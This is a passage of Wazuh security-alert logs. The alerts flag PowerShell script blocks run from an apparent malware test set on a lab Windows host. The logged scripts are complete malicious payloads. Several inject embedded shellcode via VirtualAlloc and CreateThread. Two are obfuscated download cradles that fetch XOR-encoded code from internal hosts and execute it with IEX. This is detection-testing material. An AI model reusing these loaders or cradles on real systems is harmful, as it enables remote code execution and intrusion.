a,0x3f,0xf5,0x7f,0x7d,0x3d,0x9f,0x09,0x9b,0x11,0xcf,0x59,0x34,0xd1,0xbf,0x19,0xe4,0xb9,0xd5,0x95,0xdb,0xd9,0xd5,0x7f,0x74,0x73,0x3a,0xd6,0x2c,0xeb,0xa3,0x73,0xa6,0x8a,0x2c,0xae,0xc2,0x8c,0xa7,0x5d,0x32,0x42,0x40,0x2b,0x20,0x32,0xa0,0x66,0x1a,0x94,0xbf,0x5c,0x31,0x18,0x2a,0x5b,0x90,0x4f,0xc2,0x61,0xc5,0xa7,0x4d,0x99,0x20,0xbc,0x44,0x0f,0x8b,0xaa,0xa8,0xdf,0x0b,0x2a,0xff,0xb5,0x0b,0x42,0xa7,0xed,0x5f,0x77,0xa8,0x3b,0xcc,0x24,0x3d,0xc4,0xa5,0x99,0x96,0xac,0x4b,0xc4,0xd1,0x72,0xb3,0x23,0xe0,0x4f,0x62,0x0d,0x96,0xa1,0xb6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$tUZq=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($tUZq.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$tUZq,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 44958150-8a41-483d-ac67-e3c3515d029d\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3998.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$gbE = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $gbE -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xda,0xdc,0xd9,0x74,0x24,0xf4,0xbb,0x6a,0xf6,0xab,0xef,0x5a,0x33,0xc9,0xb1,0x47,0x31,0x5a,0x18,0x03,0x5a,0x18,0x83,0xc2,0x6e,0x14,0x5e,0x13,0x86,0x5a,0xa1,0xec,0x56,0x3b,0x2b,0x09,0x67,0x7b,0x4f,0x59,0xd7,0x4b,0x1b,0x0f,0xdb,0x20,0x49,0xa4,0x68,0x44,0x46,0xcb,0xd9,0xe3,0xb0,0xe2,0xda,0x58,0x80,0x65,0x58,0xa3,0xd5,0x45,0x61,0x6c,0x28,0x87,0xa6,0x91,0xc1,0xd5,0x7f,0xdd,0x74,0xca,0xf4,0xab,0x44,0x61,0x46,0x3d,0xcd,0x96,0x1e,0x3c,0xfc,0x08,0x15,0x67,0xde,0xab,0xfa,0x13,0x57,0xb4,0x1f,0x19,0x21,0x4f,0xeb,0xd5,0xb0,0x99,0x22,0x15,0x1e,0xe4,0x8b,0xe4,0x5e,0x20,0x2b,0x17,0x15,0x58,0x48,0xaa,0x2e,0x9f,0x33,0x70,0xba,0x04,0x93,0xf3,0x1c,0xe1,0x22,0xd7,0xfb,0x62,0x28,0x9c,0x88,0x2d,0x2c,0x23,0x5c,0x46,0x48,0xa8,0x63,0x89,0xd9,0xea,0x47,0x0d,0x82,0xa9,0xe6,0x14,0x6e,0x1f,0x16,0x46,0xd1,0xc0,0xb2,0x0c,0xff,0x15,0xcf,0x4e,0x97,0xda,0xe2,0x70,0x67,0x75,0x74,0x02,0x55,0xda,0x2e,0x8c,0xd5,0x93,0xe8,0x4b,0x1a,0x8e,0x4d,0xc3,0xe5,0x31,0xae,0xcd,0x21,0x65,0xfe,0x65,0x80,0x06,0x95,0x75,0x2d,0xd3,0x00,0x73,0xb9,0x1c,0x7c,0x7a,0x3f,0xf5,0x7f,0x7d,0x3d,0x9f,0x09,0x9b,0x11,0xcf,0x59,0x34,0xd1,0xbf,0x19,0xe4,0xb9,0xd5,0x95,0xdb,0xd9,0xd5,0x7f,0x74,0x73,0x3a,0xd6,0x2c,0xeb,0xa3,0x73,0xa6,0x8a,0x2c,0xae,0xc2,0x8c,0xa7,0x5d,0x32,0x42,0x40,0x2b,0x20,0x32,0xa0,0x66,0x1a,0x94,0xbf,0x5c,0x31,0x18,0x2a,0x5b,0x90,0x4f,0xc2,0x61,0xc5,0xa7,0x4d,0x99,0x20,0xbc,0x44,0x0f,0x8b,0xaa,0xa8,0xdf,0x0b,0x2a,0xff,0xb5,0x0b,0x42,0xa7,0xed,0x5f,0x77,0xa8,0x3b,0xcc,0x24,0x3d,0xc4,0xa5,0x99,0x96,0xac,0x4b,0xc4,0xd1,0x72,0xb3,0x23,0xe0,0x4f,0x62,0x0d,0x96,0xa1,0xb6;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$tUZq=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($tUZq.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$tUZq,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"44958150-8a41-483d-ac67-e3c3515d029d","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3998.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:47.662+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":198,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304507.4084403","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:08.0943862Z","eventRecordID":"145828","processID":"7776","threadID":"1928","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$NlJ = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $NlJ -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xe8,0x73,0xdb,0x6a,0xdb,0xd4,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x7d,0x0f,0x03,0x7d,0xe7,0x91,0x2e,0x96,0x1f,0xd7,0xd1,0x67,0xdf,0xb8,0x58,0x82,0xee,0xf8,0x3f,0xc6,0x40,0xc9,0x34,0x8a,0x6c,0xa2,0x19,0x3f,0xe7,0xc6,0xb5,0x30,0x40,0x6c,0xe0,0x7f,0x51,0xdd,0xd0,0x1e,0xd1,0x1c,0x05,0xc1,0xe8,0xee,0x58,0x00,0x2d,0x12,0x90,0x50,0xe6,0x58,0x07,0x45,0x83,0x15,0x94,0xee,0xdf,0xb8,0x9c,0x13,0x97,0xbb,0x8d,0x85,0xac,0xe5,0x0d,0x27,0x61,0x9e,0x07,0x3f,0x66,0x9b,0xde,0xb4,0x5c,0x57,0xe1,0x1c,0xad,0x98,0x4e,0x61,0x02,0x6b,0x8e,0xa5,0xa4,0x94,0xe5,0xdf,0xd7,0x29,0xfe,0x1b,0xaa,0xf5,0x8b,0xbf,0x0c,0x7d,0x2b,0x64,0xad,0x52,0xaa,0xef,0xa1,0x1f,0xb8,0xa8,0xa5,0x9e,0x6d,0xc3,0xd1,0x2b,0x90,0x04,0x50,0x6f,0xb7,0x80,0x39,0x2b,0xd6,0x91,0xe7,0x9a,0xe7,0xc2,0x48,0x42,0x42,0x88,0x64,0x97,0xff,0xd3,0xe0,0x54,0x32,0xec,0xf0,0xf2,0x45,0x9f,0xc2,0x5d,0xfe,0x37,0x6e,0x15,0xd8,0xc0,0x91,0x0c,0x9c,0x5f,0x6c,0xaf,0xdd,0x76,0xaa,0xfb,0x8d,0xe0,0x1b,0x84,0x45,0xf1,0xa4,0x51,0xf3,0xf4,0x32,0x9a,0xac,0xf6,0xa9,0x72,0xaf,0xf8,0x2c,0x3f,0x26,0x1e,0x7e,0x6f,0x69,0x8f,0x3e,0xdf,0xc9,0x7f,0xd6,0x35,0xc6,0xa0,0xc6,0x35,0x0c,0xc9,0x6c,0xda,0xf9,0xa1,0x18,0x43,0xa0,0x3a,0xb9,0x8c,0x7e,0x47,0xf9,0x07,0x8d,0xb7,0xb7,0xef,0xf8,0xab,0x2f,0x00,0xb7,0x96,0xf9,0x1f,0x6d,0xbc,0x05,0x8a,0x8a,0x17,0x52,0x22,0x91,0x4e,0x94,0xed,0x6a,0xa5,0xaf,0x24,0xff,0x06,0xc7,0x48,0xef,0x86,0x17,0x1f,0x65,0x87,0x7f,0xc7,0xdd,0xd4,0x9a,0x08,0xc8,0x48,0x37,0x9d,0xf3,0x38,0xe4,0x36,0x9c,0xc6,0xd3,0x71,0x03,0x38,0x36,0x80,0x7f,0xef,0x7e,0xf6,0x91,0x33;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$LwG=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($LwG.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$LwG,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: bc4cb98a-b299-4acd-ad09-764aac76b7ca\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\4003.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$NlJ = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $NlJ -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0xe8,0x73,0xdb,0x6a,0xdb,0xd4,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x7d,0x0f,0x03,0x7d,0xe7,0x91,0x2e,0x96,0x1f,0xd7,0xd1,0x67,0xdf,0xb8,0x58,0x82,0xee,0xf8,0x3f,0xc6,0x40,0xc9,0x34,0x8a,0x6c,0xa2,0x19,0x3f,0xe7,0xc6,0xb5,0x30,0x40,0x6c,0xe0,0x7f,0x51,0xdd,0xd0,0x1e,0xd1,0x1c,0x05,0xc1,0xe8,0xee,0x58,0x00,0x2d,0x12,0x90,0x50,0xe6,0x58,0x07,0x45,0x83,0x15,0x94,0xee,0xdf,0xb8,0x9c,0x13,0x97,0xbb,0x8d,0x85,0xac,0xe5,0x0d,0x27,0x61,0x9e,0x07,0x3f,0x66,0x9b,0xde,0xb4,0x5c,0x57,0xe1,0x1c,0xad,0x98,0x4e,0x61,0x02,0x6b,0x8e,0xa5,0xa4,0x94,0xe5,0xdf,0xd7,0x29,0xfe,0x1b,0xaa,0xf5,0x8b,0xbf,0x0c,0x7d,0x2b,0x64,0xad,0x52,0xaa,0xef,0xa1,0x1f,0xb8,0xa8,0xa5,0x9e,0x6d,0xc3,0xd1,0x2b,0x90,0x04,0x50,0x6f,0xb7,0x80,0x39,0x2b,0xd6,0x91,0xe7,0x9a,0xe7,0xc2,0x48,0x42,0x42,0x88,0x64,0x97,0xff,0xd3,0xe0,0x54,0x32,0xec,0xf0,0xf2,0x45,0x9f,0xc2,0x5d,0xfe,0x37,0x6e,0x15,0xd8,0xc0,0x91,0x0c,0x9c,0x5f,0x6c,0xaf,0xdd,0x76,0xaa,0xfb,0x8d,0xe0,0x1b,0x84,0x45,0xf1,0xa4,0x51,0xf3,0xf4,0x32,0x9a,0xac,0xf6,0xa9,0x72,0xaf,0xf8,0x2c,0x3f,0x26,0x1e,0x7e,0x6f,0x69,0x8f,0x3e,0xdf,0xc9,0x7f,0xd6,0x35,0xc6,0xa0,0xc6,0x35,0x0c,0xc9,0x6c,0xda,0xf9,0xa1,0x18,0x43,0xa0,0x3a,0xb9,0x8c,0x7e,0x47,0xf9,0x07,0x8d,0xb7,0xb7,0xef,0xf8,0xab,0x2f,0x00,0xb7,0x96,0xf9,0x1f,0x6d,0xbc,0x05,0x8a,0x8a,0x17,0x52,0x22,0x91,0x4e,0x94,0xed,0x6a,0xa5,0xaf,0x24,0xff,0x06,0xc7,0x48,0xef,0x86,0x17,0x1f,0x65,0x87,0x7f,0xc7,0xdd,0xd4,0x9a,0x08,0xc8,0x48,0x37,0x9d,0xf3,0x38,0xe4,0x36,0x9c,0xc6,0xd3,0x71,0x03,0x38,0x36,0x80,0x7f,0xef,0x7e,0xf6,0x91,0x33;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$LwG=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($LwG.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$LwG,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"bc4cb98a-b299-4acd-ad09-764aac76b7ca","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\4003.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:49.117+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":199,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304509.4095752","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:08.9501343Z","eventRecordID":"145832","processID":"7064","threadID":"8116","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$Xmqb = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Xmqb -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x5f,0xbd,0x36,0x71,0xda,0xd2,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xea,0xfc,0x03,0x42,0x50,0x5f,0xc3,0x8d,0x86,0x1d,0x2c,0x6e,0x56,0x42,0xa4,0x8b,0x67,0x42,0xd2,0xd8,0xd7,0x72,0x90,0x8d,0xdb,0xf9,0xf4,0x25,0x68,0x8f,0xd0,0x4a,0xd9,0x3a,0x07,0x64,0xda,0x17,0x7b,0xe7,0x58,0x6a,0xa8,0xc7,0x61,0xa5,0xbd,0x06,0xa6,0xd8,0x4c,0x5a,0x7f,0x96,0xe3,0x4b,0xf4,0xe2,0x3f,0xe7,0x46,0xe2,0x47,0x14,0x1e,0x05,0x69,0x8b,0x15,0x5c,0xa9,0x2d,0xfa,0xd4,0xe0,0x35,0x1f,0xd0,0xbb,0xce,0xeb,0xae,0x3d,0x07,0x22,0x4e,0x91,0x66,0x8b,0xbd,0xeb,0xaf,0x2b,0x5e,0x9e,0xd9,0x48,0xe3,0x99,0x1d,0x33,0x3f,0x2f,0x86,0x93,0xb4,0x97,0x62,0x22,0x18,0x41,0xe0,0x28,0xd5,0x05,0xae,0x2c,0xe8,0xca,0xc4,0x48,0x61,0xed,0x0a,0xd9,0x31,0xca,0x8e,0x82,0xe2,0x73,0x96,0x6e,0x44,0x8b,0xc8,0xd1,0x39,0x29,0x82,0xff,0x2e,0x40,0xc9,0x97,0x83,0x69,0xf2,0x67,0x8c,0xfa,0x81,0x55,0x13,0x51,0x0e,0xd5,0xdc,0x7f,0xc9,0x1a,0xf7,0x38,0x45,0xe5,0xf8,0x38,0x4f,0x21,0xac,0x68,0xe7,0x80,0xcd,0xe2,0xf7,0x2d,0x18,0x9e,0xf2,0xb9,0x63,0xf7,0xfc,0x3d,0x0c,0x0a,0xff,0x2c,0x90,0x83,0x19,0x1e,0x78,0xc4,0xb5,0xde,0x28,0xa4,0x65,0xb6,0x22,0x2b,0x59,0xa6,0x4c,0xe1,0xf2,0x4c,0xa3,0x5c,0xaa,0xf8,0x5a,0xc5,0x20,0x99,0xa3,0xd3,0x4c,0x99,0x28,0xd0,0xb1,0x57,0xd9,0x9d,0xa1,0x0f,0x29,0xe8,0x98,0x99,0x36,0xc6,0xb7,0x25,0xa3,0xed,0x11,0x72,0x5b,0xec,0x44,0xb4,0xc4,0x0f,0xa3,0xcf,0xcd,0x85,0x0c,0xa7,0x31,0x4a,0x8d,0x37,0x64,0x00,0x8d,0x5f,0xd0,0x70,0xde,0x7a,0x1f,0xad,0x72,0xd7,0x8a,0x4e,0x23,0x84,0x1d,0x27,0xc9,0xf3,0x6a,0xe8,0x32,0xd6,0x6a,0xd4,0xe4,0x1e,0x19,0x34,0x35;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$L2tU=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($L2tU.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$L2tU,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: e0175238-b8f7-4634-b9c4-fe8222a9b06e\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\4021.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$Xmqb = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Xmqb -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x5f,0xbd,0x36,0x71,0xda,0xd2,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x13,0x83,0xea,0xfc,0x03,0x42,0x50,0x5f,0xc3,0x8d,0x86,0x1d,0x2c,0x6e,0x56,0x42,0xa4,0x8b,0x67,0x42,0xd2,0xd8,0xd7,0x72,0x90,0x8d,0xdb,0xf9,0xf4,0x25,0x68,0x8f,0xd0,0x4a,0xd9,0x3a,0x07,0x64,0xda,0x17,0x7b,0xe7,0x58,0x6a,0xa8,0xc7,0x61,0xa5,0xbd,0x06,0xa6,0xd8,0x4c,0x5a,0x7f,0x96,0xe3,0x4b,0xf4,0xe2,0x3f,0xe7,0x46,0xe2,0x47,0x14,0x1e,0x05,0x69,0x8b,0x15,0x5c,0xa9,0x2d,0xfa,0xd4,0xe0,0x35,0x1f,0xd0,0xbb,0xce,0xeb,0xae,0x3d,0x07,0x22,0x4e,0x91,0x66,0x8b,0xbd,0xeb,0xaf,0x2b,0x5e,0x9e,0xd9,0x48,0xe3,0x99,0x1d,0x33,0x3f,0x2f,0x86,0x93,0xb4,0x97,0x62,0x22,0x18,0x41,0xe0,0x28,0xd5,0x05,0xae,0x2c,0xe8,0xca,0xc4,0x48,0x61,0xed,0x0a,0xd9,0x31,0xca,0x8e,0x82,0xe2,0x73,0x96,0x6e,0x44,0x8b,0xc8,0xd1,0x39,0x29,0x82,0xff,0x2e,0x40,0xc9,0x97,0x83,0x69,0xf2,0x67,0x8c,0xfa,0x81,0x55,0x13,0x51,0x0e,0xd5,0xdc,0x7f,0xc9,0x1a,0xf7,0x38,0x45,0xe5,0xf8,0x38,0x4f,0x21,0xac,0x68,0xe7,0x80,0xcd,0xe2,0xf7,0x2d,0x18,0x9e,0xf2,0xb9,0x63,0xf7,0xfc,0x3d,0x0c,0x0a,0xff,0x2c,0x90,0x83,0x19,0x1e,0x78,0xc4,0xb5,0xde,0x28,0xa4,0x65,0xb6,0x22,0x2b,0x59,0xa6,0x4c,0xe1,0xf2,0x4c,0xa3,0x5c,0xaa,0xf8,0x5a,0xc5,0x20,0x99,0xa3,0xd3,0x4c,0x99,0x28,0xd0,0xb1,0x57,0xd9,0x9d,0xa1,0x0f,0x29,0xe8,0x98,0x99,0x36,0xc6,0xb7,0x25,0xa3,0xed,0x11,0x72,0x5b,0xec,0x44,0xb4,0xc4,0x0f,0xa3,0xcf,0xcd,0x85,0x0c,0xa7,0x31,0x4a,0x8d,0x37,0x64,0x00,0x8d,0x5f,0xd0,0x70,0xde,0x7a,0x1f,0xad,0x72,0xd7,0x8a,0x4e,0x23,0x84,0x1d,0x27,0xc9,0xf3,0x6a,0xe8,0x32,0xd6,0x6a,0xd4,0xe4,0x1e,0x19,0x34,0x35;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$L2tU=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($L2tU.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$L2tU,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"e0175238-b8f7-4634-b9c4-fe8222a9b06e","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\4021.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:49.201+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":25,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304509.4107121","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:09.6868129Z","eventRecordID":"145836","processID":"7380","threadID":"8168","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wC=NEw-OBjecT SySTEM.NET.WEbClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadeRS.ADd('User-Agent',$u);$wC.PRoxy = [System.NET.WEBReQUEst]::DEFAuLtWEbPROxy;$wc.PRoxY.CREDEnTiaLs = [SYsteM.NEt.CREDeNTIAlCaChE]::DeFaUlTNetwORKCRedenTials;$K='329e5668c388fb6a9304ce88c9bd13b1';$I=0;[cHAr[]]$B=([CHAR[]]($WC.DOwnlOAdSTRing(\"http://192.168.1.14:8080/index.asp\")))|%{$_-bXOR$K[$i++%$K.Length]};IEX ($B-joiN'')\r\n\r\nScriptBlock ID: db1340a3-5413-46b8-b945-b99dabd2bf93\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\4025.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wC=NEw-OBjecT SySTEM.NET.WEbClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeadeRS.ADd('User-Agent',$u);$wC.PRoxy = [System.NET.WEBReQUEst]::DEFAuLtWEbPROxy;$wc.PRoxY.CREDEnTiaLs = [SYsteM.NEt.CREDeNTIAlCaChE]::DeFaUlTNetwORKCRedenTials;$K='329e5668c388fb6a9304ce88c9bd13b1';$I=0;[cHAr[]]$B=([CHAR[]]($WC.DOwnlOAdSTRing(\\\"http://192.168.1.14:8080/index.asp\\\")))|%{$_-bXOR$K[$i++%$K.Length]};IEX ($B-joiN'')","scriptBlockId":"db1340a3-5413-46b8-b945-b99dabd2bf93","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\4025.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:50.678+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":26,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304510.4110911","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:10.5005187Z","eventRecordID":"145840","processID":"7824","threadID":"2852","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n[SYSTeM.NEt.SErVICEPoInTManAGer]::EXPeCt100CONtinUe = 0;$wc=NeW-OBJECt SySTem.NeT.WebClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAders.ADD('User-Agent',$u);$wC.PrOXy = [SYSTem.NeT.WEbRequESt]::DeFAULtWEBPROXy;$wC.ProxY.CreDEntiAlS = [SyStEM.NET.CRedENtiaLCaCHE]::DefaULtNETWorKCrEDEnTIaLS;$K='r@ao&pyF+BhA7J]I9RM.6mT%*C!4H2KS';$I=0;[ChAR[]]$b=([chAR[]]($wc.DoWnLOadSTRIng(\"http://192.168.10.147:8080/index.asp\")))|%{$_-bXOR$k[$I++%$k.LEnGtH]};IEX ($B-jOin'')\r\n\r\nScriptBlock ID: 44d83118-338e-4a68-b68c-f2b981cab1c8\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\4074.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"[SYSTeM.NEt.SErVICEPoInTManAGer]::EXPeCt100CONtinUe = 0;$wc=NeW-OBJECt SySTem.NeT.WebClIeNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeAders.ADD('User-Agent',$u);$wC.PrOXy = [SYSTem.NeT.WEbRequESt]::DeFAULtWEBPROXy;$wC.ProxY.CreDEntiAlS = [SyStEM.NET.CRedENtiaLCaCHE]::DefaULtNETWorKCrEDEnTIaLS;$K='r@ao&amp;pyF+BhA7J]I9RM.6mT%*C!4H2KS';$I=0;[ChAR[]]$b=([chAR[]]($wc.DoWnLOadSTRIng(\\\"http://192.168.10.147:8080/index.asp\\\")))|%{$_-bXOR$k[$I++%$k.LEnGtH]};IEX ($B-jOin'')","scriptBlockId":"44d83118-338e-4a68-b68c-f2b981cab1c8","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\4074.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:50.792+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":200,"mail":false,"groups":["windows"," 